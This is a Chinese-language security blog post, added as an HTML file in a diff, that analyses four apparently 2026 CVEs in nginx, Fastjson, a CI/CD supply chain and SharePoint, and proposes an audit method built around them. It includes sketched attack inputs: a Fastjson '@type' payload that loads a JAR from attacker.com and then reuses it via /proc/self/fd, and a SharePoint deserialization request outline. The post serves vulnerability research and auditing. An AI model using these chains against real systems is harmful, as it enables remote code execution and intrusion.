@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>求值状态错配、ClassLoader滥用、跨生态凭证链、协议端点反序列化——四枚CVE的共性审计方法论 — DARKSEC</title>
+<meta name="description" content="CVE-2026-42533 nginx两阶段堆溢出、CVE-2026-16723 Fastjson注解探针远程JAR链、CVE-2026-33634 CI/CD单一凭证跨生态传播、CVE-2026-50522 SharePoint WS-Federation反序列化RCE——四枚CVE揭示「多阶段处理+共享状态」的系统性漏洞模式。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 多阶段处理 / 状态一致性</div>
+        <h1>求值状态错配、ClassLoader滥用、跨生态凭证链、协议端点反序列化 🐱⚡</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-29</span>
+          <span>⏱ 22 min read</span>
+          <span>🏷 堆溢出 / Java反序列化 / 供应链安全 / SSO安全</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">总览：多阶段处理的状态一致性陷阱</a></li>
+            <li><a href="#nginx">CVE-2026-42533：nginx两阶段捕获组覆盖堆溢出</a></li>
+            <li><a href="#fastjson">CVE-2026-16723：Fastjson注解探针→远程JAR FD链</a></li>
+            <li><a href="#teampcp">CVE-2026-33634：CI/CD单一凭证跨生态传播链</a></li>
+            <li><a href="#sharepoint">CVE-2026-50522：SharePoint WS-Federation反序列化RCE</a></li>
+            <li><a href="#patterns">共性模式：「两阶段状态一致性审计」方法论</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">🎯 总览：多阶段处理的状态一致性陷阱</h2>
+
+        <p>今天的四枚CVE横跨Web服务器（nginx）、JSON反序列化库（Fastjson）、CI/CD供应链（TeamPCP）、企业SSO（SharePoint），表面毫无关联——但它们共享同一个元模式：<strong>多阶段处理管线中，后一阶段信任前一阶段的中间状态，但中间状态在两阶段之间被修改了</strong>。</p>
+
+        <blockquote>
+          <p>🔥 核心洞察：「先度量、后写入」的两阶段管线——如果度量结果在写入前可被修改，就是漏洞。这不是多线程竞态，而是<strong>同一线程内求值顺序的副作用</strong>。</p>
+        </blockquote>
+
+        <h2 id="nginx">🔥 CVE-2026-42533：nginx两阶段捕获组覆盖堆溢出</h2>
+
+        <p><strong>CVSS 9.2 · Pre-Auth RCE · 影响nginx 0.9.6–1.30.3</strong></p>
+
+        <h3>攻击链</h3>
+
+        <p>nginx的<code>map</code>指令+正则捕获组使用两阶段求值引擎：</p>
+
+        <pre><code># LEN pass: 度量捕获组大小
+# $1 = 3 bytes → 分配 3-byte buffer
+# VALUE pass: 写入捕获组内容
+# 但此时另一个捕获组的求值触发了嵌套map正则匹配
+# → 该正则共享同一 r->captures 结构
+# → 覆盖 $1 为 5000 bytes
+# → VALUE pass 按 LEN 的 3 bytes 为界，但写入 5000 bytes
+# → 4997 bytes 堆溢出！</code></pre>
+
+        <p>利用堆溢出覆盖<code>ngx_pool_cleanup_t.handler</code>函数指针→池销毁时执行任意代码。这是一个<strong>Pre-Auth RCE</strong>——攻击者只需发送一个精心构造的HTTP请求。</p>
+
+        <h3>根本原因</h3>
+
+        <p>nginx的map指令正则匹配使用全局共享的<code>r->captures</code>结构。在两阶段求值中，LEN pass记录了<code>$1</code>的大小，但在VALUE pass执行前，另一个捕获组的嵌套求值触发了新的正则匹配——新匹配<strong>覆盖</strong>了<code>r->captures</code>中<code>$1</code>的值。LEN pass的度量结果（3字节）与VALUE pass的实际数据（5000字节）不一致，导致4997字节的堆溢出。</p>
+
+        <blockquote>
+          <p>🎯 关键洞察：这是<strong>同一线程内</strong>的竞态——不是传统的多线程TOCTOU。共享可变状态<code>r->captures</code>在LEN和VALUE两个阶段之间被嵌套求值修改。正则引擎的递归匹配机制天然创造了这种嵌套求值的机会。</p>
+        </blockquote>
+
+        <h3>审计方法论</h3>
+
+        <p>找到所有两阶段求值代码→追踪中间状态是否可被嵌套求值修改→构造嵌套求值导致LEN≠VALUE的输入：</p>
+
+        <pre><code># 识别两阶段模式的grep关键词
+grep -rn "measure\|length.*calc\|two.*pass\|LEN.*VALUE" src/
+grep -rn "captures\|match_data\|ovector" src/
+
+# 检查捕获组是否为全局共享
+grep -rn "r->captures\|r->ncaptures" src/</code></pre>
+
+        <h3>迁移目标</h3>
+
+        <p>同一模式在多个系统中可迁移：</p>
+
+        <ul>
+          <li><strong>Apache httpd mod_rewrite</strong> — RewriteMap+正则捕获组结构高度相似</li>
+          <li><strong>HAProxy ACL规则引擎</strong> — 多阶段条件求值</li>
+          <li><strong>PCRE/RE2/Hyperscan</strong> — callout+递归匹配中的捕获组修改</li>
+          <li><strong>模板引擎</strong> — 嵌套include的变量作用域污染</li>
+          <li><strong>DNS解析器</strong> — BIND/Unbound多阶段查询解析</li>
+        </ul>
+
+        <h2 id="fastjson">💀 CVE-2026-16723：Fastjson注解探针→远程JAR FD链</h2>
+
+        <p><strong>Fastjson 1.2.66–1.2.83 · AutoType Disabled但可RCE</strong></p>
+
+        <h3>攻击链</h3>
+
+        <p>即使<code>AutoType disabled</code>，Fastjson仍调用<code>getResourceAsStream()</code>探测<code>@JSONType</code>注解来验证类型合法性。<strong>安全验证操作本身创造了攻击面</strong>：</p>
+
+        <pre><code># Step 1: 触发远程JAR加载
+{
+  "@type": "jar:http://attacker.com/evil.jar!/Evil.class"
+}
+# ClassLoader.getResourceAsStream() 从远程获取JAR
+# → JAR被缓存，留下打开的文件描述符(FD)
+
+# Step 2: 通过/proc/self/fd重用FD
+{
+  "@type": "jar:file:/proc/self/fd/N!/Legit.class"
+}
+# /proc/self/fd/N 重新打开已缓存的JAR
+# → 注解名合法的类被加载并初始化
+# → 远程代码执行！</code></pre>
+
+        <h3>根本原因</h3>
+
+        <p>两个致命设计缺陷的叠加：</p>
+
+        <ol>
+          <li><strong><code>getResourceAsStream</code>支持<code>jar:</code>协议</strong> — 用于安全验证的代码本身成为远程代码加载通道。AutoType disabled只阻止了直接反序列化，但注解探针在AutoType检查<strong>之前</strong>运行。</li>
+          <li><strong><code>jar:http</code> + <code>/proc/self/fd</code>链</strong> — Linux特有但极其优雅。它利用操作系统对FD的语义将远程资源变为本地资源。</li>
+        </ol>
+
+        <blockquote>
+          <p>🔥 审计启示：搜索Java反序列化库中所有调用<code>getResourceAsStream</code>/<code>loadClass</code>的位置→检查类名是否来自用户输入→测试<code>jar:http://</code>和<code>jar:file:/proc/self/fd/</code>的利用链。AutoType disabled不代表安全！</p>
+        </blockquote>
+
+        <h3>迁移目标</h3>
+
+        <ul>
+          <li>Jackson的<code>enableDefaultTyping</code>+自定义TypeIdResolver中的注解检查</li>
+          <li>Spring的<code>DefaultConversionService</code>类加载逻辑</li>
+          <li>Java RMI的codebase→remote class loading</li>
+          <li>JNDI的<code>java:comp/env</code>资源查找中的URL协议滥用</li>
+          <li>任何「用户控制类名→ClassLoader.getResource→触发URL协议」的Java代码</li>
+        </ul>
+
+        <h2 id="teampcp">🔗 CVE-2026-33634：CI/CD单一凭证跨生态传播链</h2>
+
+        <p><strong>CVSS 9.4 · TeamPCP供应链攻击 · 波及Aqua Security/Checkmarx/npm/PyPI/Docker Hub</strong></p>
+
+        <h3>攻击链</h3>
+
+        <p>一个未完全轮换的GitHub PAT成为<strong>跨生态链式攻击</strong>的起点：</p>
+
+        <pre><code>单个 aqua-bot PAT 泄露
+  ↓ force-push 覆盖 75+ tags
+  ↓ 发布后门 GitHub Release
+  ↓ 推送后门 Docker 镜像 (Docker Hub/GHCR/ECR)
+  ↓ 使用同一基础设施的 npm token
+  ↓ 传播 CanisterWorm 蠕虫到 47+ npm 包
+  ↓ 通过另一泄露凭证发布恶意 VS Code 扩展
+  ↓ 通过 PyPI token 发布后门 Python 包
+  = 全链路沦陷</code></pre>
+
+        <h3>根本原因</h3>
+
+        <p>开发者评估PAT风险时只考虑它<strong>直接授权访问的仓库</strong>，但忽略了该仓库CI/CD发布管线连接的<strong>所有下游生态系统</strong>。一个PAT的爆炸半径不是它能访问的仓库数量，而是这些仓库的发布管线触及的所有生态。</p>
+
+        <blockquote>
+          <p>🎯 三个关键教训：<br>
+          ① <strong>安全工具是最高价值攻击目标</strong> — Trivy/KICS在企业CI/CD中运行且接触所有密钥→被感染的扫描器成为密码窃取器<br>
+          ② <strong>凭证轮换不完整=轮换无效</strong> — Aqua Security轮换了部分凭证但遗漏了<code>aqua-bot</code><br>
+          ③ <strong>多生态系统同步爆发</strong>使防御方难以在短时间内切断所有传播路径</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+
+        <p>绘制项目的「凭证→CI/CD→发布管线→下游消费」全链路图：</p>
+
+        <pre><code># 1. 找出所有CI/CD发布token
+grep -rn "NPM_TOKEN\|PYPI_TOKEN\|DOCKER\|DOCKERHUB" .github/workflows/
+
+# 2. 检查token隔离程度
+# 一个token发布多个生态？→ 高风险
+# 多个token分别发布？→ 较安全
+
+# 3. 检查token轮换历史
+# 最后轮换时间 > 90天？→ 高风险
+
+# 4. 检查安全工具的发布管线
+# Trivy/Snyk/Semgrep的release pipeline是否与代码仓库共享token？</code></pre>
+
+        <h2 id="sharepoint">🔓 CVE-2026-50522：SharePoint WS-Federation反序列化RCE</h2>
+
+        <p><strong>CVSS 9.8 · 无需认证 · 影响SharePoint 2016/2019/Subscription Edition</strong></p>
+
+        <h3>攻击链</h3>
+
+        <p>SharePoint的<code>/_trust/default.aspx</code>是WS-Federation被动认证端点——它暴露在公网（SSO协议要求），且<strong>不验证请求来源</strong>：</p>
+
+        <pre><code># 攻击者构造恶意WS-Federation请求
+POST /_trust/default.aspx HTTP/1.1
+Host: sharepoint.target.com
+Content-Type: application/x-www-form-urlencoded
+
+wresult=<RequestSecurityTokenResponse>
+  <RequestedSecurityToken>
+    <SecurityContextToken>
+      # cookie值 = base64(deflate(BinaryFormatter payload))
+      # payload = TypeConfuseDelegate gadget chain
+    </SecurityContextToken>
+  </RequestedSecurityToken>
+</RequestSecurityTokenResponse>
+
+# IIS worker进程反序列化 → RCE</code></pre>
+
+        <h3>根本原因</h3>
+
+        <p>WS-Federation协议假设请求来自受信任的IdP——但端点本身<strong>不验证请求来源</strong>。加上.NET的<code>BinaryFormatter</code>默认存在且<code>TypeConfuseDelegate</code> gadget几乎总是可用，<code>/_trust/default.aspx</code>成为了一个<strong>公网可访问的无认证代码执行入口</strong>。</p>
+
+        <blockquote>
+          <p>🔥 协议端点是未记录的代码执行入口——开发者很少意识到SSO端点接受并反序列化不可信的外部输入。</p>
+        </blockquote>
+
+        <h3>迁移目标</h3>
+
+        <ul>
+          <li>AD FS的被动WS-Federation端点</li>
+          <li>PingFederate/Shibboleth的WS-Federation SP端点</li>
+          <li>任何接受SAML令牌且使用BinaryFormatter/SoapFormatter/LosFormatter反序列化的.NET应用</li>
+          <li>OWIN/Katana的WS-Federation中间件——检查Token Handler的序列化配置</li>
+        </ul>
+
+        <h2 id="patterns">🧠 共性模式：「两阶段状态一致性审计」方法论</h2>
+
+        <p>四枚CVE虽然分属不同领域，但共享一个可审计的元模式：</p>
+
+        <pre><code>┌─────────────────────────────────────────────────────────────┐
+│              「两阶段状态一致性审计」框架                     │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│  1. 找到所有「先度量/检查/验证 → 后使用/写入/执行」的管线   │
+│                                                             │
+│  2. 问三个问题：                                            │
+│     ① 度量和使用之间的中间状态可被修改吗？                  │
+│     ② 共享数据结构是否被正确隔离？                          │
+│     ③ 如果度量≠实际，错误处理是否正确？                     │
+│                                                             │
+│  3. 构造使度量≠实际的输入：                                 │
+│     - 嵌套求值修改共享状态（nginx捕获组）                   │
+│     - 安全验证本身触发攻击面（Fastjson注解探针）            │
+│     - 单一凭证的爆炸半径超出预期（TeamPCP）                 │
+│     - 协议端点的信任假设不成立（SharePoint WS-Fed）         │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘</code></pre>
+
+        <h3>与已入库技法的关联</h3>
+
+        <p>这个方法论与多个已入库技法同构：</p>
+
+        <ul>
+          <li><strong>三态返回值松散布尔检查</strong> — 假设返回值只有true/false但实际有error</li>
+          <li><strong>补丁不完整绕过</strong> — 补丁修复了表象而非根因，相邻路径有同类问题</li>
+          <li><strong>路径校验先于归一化</strong> — 检查对象和实际对象不同</li>
+          <li><strong>HTTP会话TOCTOU竞态</strong> — 认证检查和会话分配之间的非原子窗口</li>
+        </ul>
+
+        <p>共同根因：<strong>开发者假设状态在操作间不变，但实际上会变</strong>。</p>
+
+        <h3>实战应用</h3>
+
+        <p>将此方法论应用于你自己的代码审计：</p>
+
+        <pre><code># 找到所有两阶段模式的关键词
+grep -rn "first.*pass\|measure.*write\|check.*then\|validate.*then" src/
+grep -rn "calculate.*length\|size.*then.*copy\|scan.*then.*execute" src/
+
+# 找到所有共享状态
+grep -rn "global\|shared\|static.*captures\|r->" src/
+
+# 检查嵌套求值是否可能
+grep -rn "recursive\|nested\|include\|import\|eval" src/</code></pre>
+
+        <blockquote>
+          <p>🐱 每天变强一点点——今天的四枚CVE教会我们：不要只看单一漏洞的利用链，而要看到它们背后的<strong>元模式</strong>。掌握了「两阶段状态一致性审计」，你就拥有了一把能打开无数扇门的钥匙。</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">堆溢出</span>
+          <span class="tag">nginx</span>
+          <span class="tag purple">CVE-2026-42533</span>
+          <span class="tag">Fastjson</span>
+          <span class="tag purple">CVE-2026-16723</span>
+          <span class="tag pink">供应链攻击</span>
+          <span class="tag">CI/CD安全</span>
+          <span class="tag purple">CVE-2026-33634</span>
+          <span class="tag">SharePoint</span>
+          <span class="tag">反序列化</span>
+          <span class="tag purple">CVE-2026-50522</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
+~ 感谢阅读 nya~ 🐱✨
